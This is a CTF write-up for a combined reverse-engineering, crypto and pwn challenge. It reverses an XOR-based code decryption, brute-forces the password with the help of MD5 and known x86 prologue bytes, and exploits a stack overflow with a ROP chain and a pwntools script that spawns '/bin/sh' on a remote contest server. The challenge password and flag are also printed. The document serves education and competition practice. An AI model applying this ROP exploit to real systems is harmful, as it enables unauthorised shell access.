# meow (RE/Crypto/Pwn 365)

###ENG

Judging by points alone, this was most difficult challenge on the CTF - probably because of unusual mix of cryptography, RE and PWN.

We are given strange binary, that asks us for a password and decrypts two chunks od data with it:

```asm
lea     rdi, aHello?    ; "***** hello? *****\n>>> "
mov     eax, 0
call    _printf
mov     rdx, cs:__bss_start ; stream
lea     rax, [rbp+s]
mov     esi, 0Bh        ; n
mov     rdi, rax        ; s
call    _fgets
lea     rax, [rbp+s]
mov     rdi, rax
call    check_md5
mov     [rbp+var_1C], eax
cmp     [rbp+var_1C], 1
jnz     short ok
lea     rdi, aSorryBye  ; "Sorry, bye!"
call    _puts
mov     edi, 0          ; status
call    _exit
; ---------------------------------------------------------------------------

ok:          
```

and `check_md5` is:

```asm
check_md5       proc near               ; CODE XREF: main+152

var_98          = qword ptr -98h
var_90          = byte ptr -90h
s2              = byte ptr -30h
var_28          = qword ptr -28h
s1              = byte ptr -20h
var_4           = dword ptr -4

                push    rbp
                mov     rbp, rsp
                sub     rsp, 0A0h
                mov     [rbp+var_98], rdi
                mov     [rbp+var_4], 0
                mov     rax, 618F652224A9469Fh
                mov     qword ptr [rbp+s2], rax
                mov     rax, 14B97D8EE7DE0DA8h
                mov     [rbp+var_28], rax
                lea     rax, [rbp+var_90]
                mov     rdi, rax
                call    _MD5_Init
                mov     rcx, [rbp+var_98]
                lea     rax, [rbp+var_90]
                mov     edx, 0Ah
                mov     rsi, rcx
                mov     rdi, rax
                call    _MD5_Update
                lea     rdx, [rbp+var_90]
                lea     rax, [rbp+s1]
                mov     rsi, rdx
                mov     rdi, rax
                call    _MD5_Final
                lea     rcx, [rbp+s2]
                lea     rax, [rbp+s1]
                mov     edx, 10h        ; n
                mov     rsi, rcx        ; s2
                mov     rdi, rax        ; s1
                call    _strncmp
                test    eax, eax
                jz      short loc_1460
                mov     eax, 1
                jmp     short locret_1465
; ---------------------------------------------------------------------------

loc_1460:                               ; CODE XREF: check_md5+92
                mov     eax, 0

locret_1465:                            ; CODE XREF: check_md5+99
                leave
                retn
check_md5       endp
```

So this binary is computing md5 hash of our input, and compares it to hardcoded value. Of course we expected that this md5 will be easily crackable, or at least in some online database.
This turned out not to be the case - it was impossible to crack this hash (at least with our budget, we're not NSA). Even though the password has only 10 characters, so it's not very strong.

So we looked further - what does this program do with our password later?

This is more readable in C:

```c
  decrypt(&first_chunk, &our_password, first_len);
  decrypt(&second_chunk, &our_password, second_len);
  qmemcpy_(&blob_1, v17, first_len, &first_chunk);
  qmemcpy_(&blob_2, v16, second_len, &second_chunk);
```

And later, main function of program:

```c
__int64 sub_C45()
{
  int v1; // [sp+Ch] [bp-4h]@1

  v1 = 1;
  puts("- What kind of pet would you like to have?\n- Select the number of pet!");
  printf("1. angelfish\n2. bear\n3. cat\n4. dog\n5. I don't want pets\n# number = ");
  __isoc99_fscanf(_bss_start, "%1d", &v1);
  if ( v1 <= 0 || v1 > 5 )
  {
    puts("*** bad number ***");
    exit(0);
  }
  switch ( v1 )
  {
    case 1:
      sub_C00();
      break;
    case 2:
      sub_C17();
      break;
    case 3:
      blob_1();  // <- here
      break;
    case 4:
      sub_C2E();
      break;
    case 5:
      exit(0);
      break;
  }
  return 0LL;
}
```

So this program decrypts code with our password, and executes it!

This gives us some possiblities, but not much - for example, we can guess prologue and epilogue of function.

Now let's look at encryption. We reimplemented it in python as follows:

```python
def decrypt_chunks(data, passw, k, sd, s0, st):
    """
    encrypt chunks with size k
    start with [s0 bytes from front] [k-s0 bytes from back]
    start with s=s0
    after every round add sd to s
    when s == st, change s to s0 again
    """
    buff = [0] * 16
    split = s0
    of = 0
    ob = len(data)
    for i in range(len(data) / k):
        for j in range(split):
            buff[j] = data[j + of]
        for j in range(k - split):
            buff[j + split] = data[split + ob - k + j]
        for j in range(k):
            buff[j] ^= passw[j]
        for j in range(split):
            data[j + of] = buff[j + k - split]
        for j in range(k - split):
            data[split + ob - k + j] = buff[j]
        of += split
        ob -= k - split
        if split == st:
            split = s0
        else:
            split += sd


def decrypt(data, passw):
    pass1 = [passw[2*i+1] for i in range(5)]

    decrypt_chunks(data, passw, 7, 2, 3, 7)
    decrypt_chunks(data, pass1, 5, -1, 5, 1)
    decrypt_chunks(data, passw, 10, 1, 4, 8)
    decrypt_chunks(data, passw, 10, 1, 4, 8)
```

And encryption, because it's easy to guess knowing how to decrypt:

```python
def encrypt_chunks(data, passw, k, sd, s0, st):
    """
    encrypt chunks with size k
    start with [s0 bytes from front] [k-s0 bytes from back]
    start with s=s0
    after every round add sd to s
    when s == st, change s to s0 again
    """
    buff = [0] * 16
    split = s0
    of = 0
    ob = len(data)
    for i in range(len(data) / k):
        for j in range(split):
            buff[j + k - split] = data[j + of]
        for j in range(k - split):
            buff[j] = data[split + ob - k + j]
        for j in range(k):
            buff[j] ^= passw[j]
        for j in range(split):
            data[j + of] = buff[j]
        for j in range(k - split):
            data[split + ob - k + j] = buff[j + split]
        of += split
        ob -= k - split
        if split == st:
            split = s0
        else:
            split += sd

def encrypt(data, passw):
    pass1 = [passw[2*i+1] for i in range(5)]

    encrypt_chunks(data, passw, 10, 1, 4, 8)
    encrypt_chunks(data, passw, 10, 1, 4, 8)
    encrypt_chunks(data, pass1, 5, -1, 5, 1)
    encrypt_chunks(data, passw, 7, 2, 3, 7)
```

And that's basically all we know. We also have encrypted blobs:


```python
data0 = """
F1 64 72 4A 4F 48 4D BA  77 73 1D 34 F5 AF B8 0F
24 56 11 65 47 A3 2F 73  A4 56 4F 70 4A 13 57 9C
3F 6F 06 61 40 90 AF 39  10 29 34 C3 00 7A 40 3D
4E 3F 0E 2A 2F 20 7F 73  89 7D 4B 1D 09 AA D0 00
21 89 4D 2A 67 7C 18 3B  39 F2 8D 1C A7 71 57 2E
31 14 67 48 3C 7D AF 70  AE 10 31 68 D1 26 05 C8
25 F2 62 F5 5D 38 34 F2  20 0E 7E 9F FB 57 72 26
57 67 15 10 15 13 B9 3E  79 89 5D 24 12 01 98 7B
18 25 E0 DF 7C 24 1B 2D  44 B0 10 3D 57 3D 62 B4
21 1D 3E D1 10 D7 45 74  96 2B 6D 3B ED 10 00 67
31 DF 6C B8 86 1A 7C 6B  64 78 C6 37 76 E6 61 A0
AD BE 4C BA A7 0D
""".replace('\n', '').replace(' ', '').decode('hex')

data1 = """
08 4F FE AB 4E AA B4 03  4D 99 6E A1 48 D0 7D A2
E0 49 38 61 2D BC 5E 2C  5D 62 3F 89 C6 B8 5C 5A
4B 13 41 07 DF BF C2 29  07 64 14 25 32 00 73 69
2D 58 4B 76 15 29 2F A1  00 00 00 00 00 00 00 00
""".replace('\n', '').replace(' ', '').decode('hex')
```

That's the end of `RE` part (not very easy, but manageable), now comes `Crypto`.

How can we decrypt the code, and second blob? Well, If we look at the "encrypt" function, it's just a lot of xors with password characters, and permuting order. What exactly is xored? Maybe it's possible to reverse it easily?

Let's check. I used our SymbolicXor class (it's very useful in situations like this)

```python
class SymbolicXor:
    def __init__(self, ops, const=0):
        if isinstance(ops, str):
            ops = [ops]
        self.ops = sorted(ops)
        self.const = const

    def __xor__(self, other):
        if isinstance(other, int):
            return SymbolicXor(self.ops, self.const ^ other)
        elif isinstance(other, SymbolicXor):
            return SymbolicXor(self.setxor(self.ops, other.ops), self.const ^ other.const)

    __rxor__ = __xor__

    def setxor(self, a, b):
        out = list(a)
        for el in b:
            if el in out:
                out.remove(el)
            else:
                out.append(el)
        return out

    def __str__(self):
        if self.const == 0 and not self.ops:
            return '0'
        return '^'.join(str(c) for c in self.ops + ([self.const] if self.const else []))

    __repr__ = __str__

    def __eq__(self, oth):
        return self.ops == oth.ops and self.const == oth.const
```

And:
```python
def make_sympad(syms):
    passw = [SymbolicXor('v'+str(i)) for i in range(16)]
    pad = map(ord, '\0' * syms)
    decrypt(pad, passw)
    return pad

def permute(data):
    perm = map(ord, data)
    decrypt(perm, [0]*16)
    return ''.join(map(chr, perm))

def transform(data, maps):
    # pad - encrypted and permutted zeroes - so plain 'one time pad' generated from password
    pad = make_sympad(len(data))

    # perm - permutation of encrypted data, so they are in original order
    perm = permute(data)

    out = ''
    for i in range(len(data)):
        a = pad[i]
        #print perm[i].encode('hex'),
        for con, sym in maps:
            if sym == a:
                #print chr(ord(perm[i]) ^ con).encode('hex'), a
                #print chr(ord(perm[i]) ^ con), a
                c = chr(ord(perm[i]) ^ con)
                if c not in string.printable:
                    return None
                out += c
                break
        else:
            #print '?', a
            out += '?'
    return out
```

This allowed me to show all constraints, or rather answer the question `"what is this byte xored with"`

```
00 ? v2^v5
aa ? v2^v3
48 ? v1^v8
d0 ? v3^v9
b4 ? v0^v3^v5^v9
00 ? v1^v3^v5^v6
00 ? v2^v5^v6^v7
4d ? v0^v3^v7^v8
00 ? v3^v4
5d ? v4^v8
62 ? v2^v3^v5^v9
a1 ? v0^v3^v5^v6
4f O 0
fe ? v8^v9
4e ? v1^v3^v7^v9
29 ? v3^v5
00 ? v4^v5^v7
13 ? v0^v5^v7^v8
89 ? v1^v4^v6^v9
a1 ? v0^v1^v4^v7
00 ? v1^v3^v5^v8
00 ? v2^v5^v6^v9
38 ? v0^v2^v4^v9
5a ? v1^v3^v5^v7
4b ? v2^v4^v6^v9
41 ? v1^v5^v7^v9
b8 ? v1^v8
32 ? v3^v6^v7^v9
2c ? v7^v8
61 a 0
76 ? v2^v5
07 ? v2^v3
25 ? v4^v5^v8^v9
29 ? v1^v5^v9
df ? v3^v9
73 ? v3^v5
69 ? v5^v6
c2 ? v0^v7
07 ? v0^v2^v6
64 ? v1^v3^v7
14 ? v2^v4^v8
bf ? v1^v3^v4^v9
58 ? v0^v1
4b ? v1^v3
3f ? v0^v2^v3^v5
2d ? v1^v7
2d ? v0^v2^v3^v7
bc ? v1^v3^v4^v9
15 ? v2^v3
08 ? v4^v9
2f ? v1^v3^v5^v9
c6 ? v2^v3^v5^v6
5c ? v0^v3^v5^v7
5e ? v0^v1^v4^v5
7d } 0
a2 ? v0^v2^v3^v7
e0 ? v1^v3^v5^v8
49 ? v2^v4^v7^v9
ab ? v5^v6
99 ? v1^v7
6e ? v3^v8
03 ? v1^v3^v4^v9
00 ? v0^v1
00 ? v1^v3
```

First column: value in ciphertext
Second column: plaintext byte, if known (known only if we're xoring with zero, of course)
Third column: password chars we're xoring with (v0 = first char, v1 = second char, etc)

Ok, it's something but not enough. In fact, this was very misleading, because we thought that this second encrypted blob is flag, or at least plaintext (all known bytes are printable)! This turned out not to be the case, and I wasted a lot of time, unfortunatelly.

But to the point, I think word of explaination is due (i skipped a lot of things). What does this even do:

```python
def make_sympad(syms):
    passw = [SymbolicXor('v'+str(i)) for i in range(16)]
    pad = map(ord, '\0' * syms)
    decrypt(pad, passw)
    return pad

def permute(data):
    perm = map(ord, data)
    decrypt(perm, [0]*16)
    return ''.join(map(chr, perm))

def transform(data, maps):
    # pad - encrypted and permutted zeroes - so plain 'one time pad' generated from password
    pad = make_sympad(len(data))

    # perm - permutation of encrypted data, so they are in original order
    perm = permute(data)
```

So, I knew that everything is just xoring - so in theory if I'll encrypt zeroes, I'll know exactly what gets xored with what (because of SymbolicXor class). But there is small problem, order of characters in ciphertext is permuted, so I had to create `permute` function that reverses that permutation (I know, not the best name).

Going back to our ciphertexts - I discovered that if we decrypt both ciphertexts, they both have the same start and similar end. And because we know that first ciphertext is code, that means that second CT must be too.

What can we do with this knowledge? A lot!. 

We assumed most standard prologue and epilogue, and came out with something like this (excuse non-standard notation) - for fragments that was the same in both ciphertexts:

```
    ((0x55 ^ 0x0d), SymbolicXor(['v5', 'v2'])),  # push rbp
    ((0x48 ^ 0x48), SymbolicXor(['v2', 'v3'])),  # mov rbp, rsp
    ((0x89 ^ 0xf5), SymbolicXor(['v1', 'v8'])),  
    ((0xe5 ^ 0xaf), SymbolicXor(['v3', 'v9'])),
    ((0x48 ^ 0x4d), SymbolicXor(['v0', 'v3', 'v5', 'v9'])),  # lea rdi [stuff]
    ((0xa7 ^ 0xC3), SymbolicXor(['v1', 'v3'])), # ret at the end
```

This list means for example that `v5 ^ v2 == 0x55 ^ 0x0d`. So what? Well, by itself it's useless, but remember that we know md5 of whole password! So now we can intelligently bruteforce everything:

```python
import hashlib
import string

charset = string.printable
sought = '9F46A92422658F61A80DDEE78E7DB914'.decode('hex')

for o1 in map(ord, charset):
    o3 = o1 ^ (0xa7 ^ 0xc3)
    o8 = o1 ^ (0x89 ^ 0xf5)
    o2 = o3 ^ (0x48 ^ 0x48)
    o5 = o2 ^ (0x55 ^ 0x0d)
    o9 = o3 ^ (0xe5 ^ 0xaf)
    o0 = o3 ^ o5 ^ o9 ^ (0x48 ^ 0x4d)
    
    v0 = chr(o0)
    v1 = chr(o1)
    v2 = chr(o2)
    v3 = chr(o3)
    v5 = chr(o5)
    v8 = chr(o8)
    v9 = chr(o9)

    for v4 in charset:
        for v6 in charset:
            for v7 in charset:
                passw = v0 + v1 + v2 + v3 + v4 + v5 + v6 + v7 + v8 + v9
                if hashlib.md5(passw).digest() == sought:
                    print passw
```

And... it worked!

```
$ ./brute
$W337k!++y
```

Awesome, let's use it and get the flag:

```
╰─$ ./meow.exe
***** hello? *****
>>> $W337k!++y
- What kind of pet would you like to have?
- Select the number of pet!
1. angelfish
2. bear
3. cat
4. dog
5. I don't want pets
# number = 3
Did you choose a cat?????
What type of cat would you prefer? '0'
>>>0
fish: “./meow.exe” terminated by signal SIGSEGV (Address boundary error)
```

Wait, what? WTF codegate, where is my flag? Let's reverse what happened. This is decrypted function that gets called:

```asm
sub_7FFF3A41CC70 proc near

var_60= qword ptr -60h
var_58= qword ptr -58h
var_50= qword ptr -50h
var_48= qword ptr -48h
var_40= qword ptr -40h
var_38= qword ptr -38h
var_30= qword ptr -30h
var_28= qword ptr -28h
var_20= dword ptr -20h
var_1C= byte ptr -1Ch

push    rbp
mov     rbp, rsp
sub     rsp, 60h
mov     rax, 20756F7920646944h
mov     [rbp+var_60], rax
mov     rax, 612065736F6F6863h
mov     [rbp+var_58], rax
mov     rax, 3F3F3F3F74616320h
mov     [rbp+var_50], rax
mov     rax, 7420746168570A3Fh
mov     [rbp+var_48], rax
mov     rax, 6320666F20657079h
mov     [rbp+var_40], rax
mov     rax, 646C756F77207461h
mov     [rbp+var_38], rax
mov     rax, 65727020756F7920h
mov     [rbp+var_30], rax
mov     rax, 273027203F726566h
mov     [rbp+var_28], rax
mov     [rbp+var_20], 3E3E3E0Ah
mov     [rbp+var_1C], 0
lea     rax, [rbp+var_60]
mov     edx, 44h
mov     rsi, rax
mov     edi, 1
mov     eax, 1
syscall
lea     rax, [rbp+8]
mov     edx, 18h
mov     rsi, rax
mov     edi, 0
mov     eax, 0
syscall
nop
leave
retn
sub_7FFF3A41CC70 endp
```

See it yet? Yes, this code reads 18 bytes **on the stack, overwriting the return address**. Yeah, we're in pwn challenge now.

But this won't stop us. Fortunatelly, exploit turned out to be easier than I thought, because second ciphertext was clearly meant to help us:

```asm
sub_7FFF3A41CC30 proc near

var_8= qword ptr -8

push    rbp
mov     rbp, rsp
sub     rsp, 10h
mov     [rbp+var_8], rdi
mov     rax, [rbp+var_8]
mov     edx, 0
mov     esi, 0
mov     rdi, rax
mov     eax, 3Bh
syscall
nop
leave
retn
sub_7FFF3A41CC30 endp

; ---------------------------------------------------------------------------
db    0
db    0
aBinSh db '/bin/sh',0
db    0
db    0
db    0
db    0
db    0

; =============== S U B R O U T I N E =======================================


sub_7FFF3A41CC66 proc near
pop     rdi
retn
```

Additionally this code was loaded at constant offset in memory, so this should be easy as PWN 100 in High-School CTF.

Our ROP chain will look like this:

```
[pop rdi gadget]
"/bin/sh"
[shellcode]
```

So we'll pop "/bin/sh" to edi, and execute execve systall with it.

Easy enough wth pwnlib!

```python
from pwn import *

r = remote('110.10.212.139', 50410)

print r.recv()

r.send('$W337k!++y\n')

print r.recv()
print r.recv()

r.send('3\n')

print r.recv()

import struct

ra = struct.pack('<Q', 0x14000)
gadget = struct.pack('<Q', 0x014036)
shell = struct.pack('<Q', 0x14029)

cat = gadget + shell + ra

print cat.encode('hex')

r.send(cat)

r.interactive()
```

Annd... It worked, and gave us flag (finally!):

```
$ cat fflag
flag{what a lovely kitty!}
```
